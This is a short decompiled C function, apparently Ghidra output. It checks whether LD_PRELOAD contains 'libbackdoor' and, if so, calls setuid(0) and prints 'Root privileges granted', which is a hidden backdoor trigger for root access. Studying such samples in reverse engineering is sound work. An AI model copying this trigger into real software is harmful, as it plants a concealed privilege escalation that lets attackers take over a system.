
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void j(void)

{
  char *pcVar1;
  char *z;
  
  pcVar1 = getenv("LD_PRELOAD");
  if (pcVar1 != (char *)0x0) {
    pcVar1 = strstr(pcVar1,"libbackdoor");
    if (pcVar1 != (char *)0x0) {
      setuid(0);
      puts("Root privileges granted");
    }
  }
  return;
}

